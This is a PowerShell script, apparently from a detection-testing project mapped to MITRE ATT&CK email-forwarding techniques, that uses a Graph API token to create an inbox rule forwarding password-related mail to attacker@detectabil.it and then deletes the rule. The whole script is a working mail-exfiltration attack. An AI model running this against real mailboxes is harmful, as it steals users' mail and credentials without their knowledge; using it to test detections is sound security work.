<#
.SYNOPSIS
Connect to Graph API and create a webhook for new incoming messages

.DESCRIPTION
TA0009/10: Collection & Exfiltration
T1114.003: Email Collection: Email Forwarding Rule
1st attack method
#>

Get-Module | Where-Object name -eq readenv | Remove-Module
Import-Module ../APIs/readEnv.psm1
Get-Module | Where-Object name -eq custom | Remove-Module
Import-Module ../APIs/custom.psm1

# We use the ews environment variables
Import-Environment "graph.env"

Get-Module | Where-Object name -eq oauth-microsoft | Remove-Module
Import-Module ../APIs/oauth-microsoft.psm1
$scope = "MailboxSettings.ReadWrite"
if ($null -eq $accessToken) { $accessToken = Get-DelegatedAccessToken -tenantId $env:TENANT_ID -clientId $env:GRAPH_DELEGATE_CLIENT_ID -scope $scope -redirectUrl $env:GRAPH_DELEGATE_REDIRECT_URI }


# Create a subscription for email messages
$url = "https://graph.microsoft.com/v1.0/me/mailFolders/inbox/messageRules"
$rand = Get-Random -Minimum 1000 -Maximum 9999

$body = @{
  "displayName" = "Totally not suspicious mailfowarding rule $rand";
  "sequence" = 2;
  "isEnabled" = $True;
  "conditions" = @{
      "senderContains" = @("password");
   };
   "actions" = @{
      "forwardTo" = @(
        @{
           "emailAddress" = @{
              "name" = "Attacker";
              "address" = "attacker@detectabil.it";
            };
         };
      );
      "stopProcessingRules" = $True;
   };
}
$body = ConvertTo-Json -Depth 99 $body
$response = Invoke-RestMethod $url -Method Post -ContentType "application/json" -Headers @{"Authorization"="Bearer $accessToken"} -Body $body
$ruleId = $response.id


# Delete the mail rule again
Wait-KeyOrTimeOut -Timeout 90000

$url = "$url/$ruleId"
Invoke-RestMethod $url -Method Delete -ContentType "application/json" -Headers @{"Authorization"="Bearer $accessToken"}
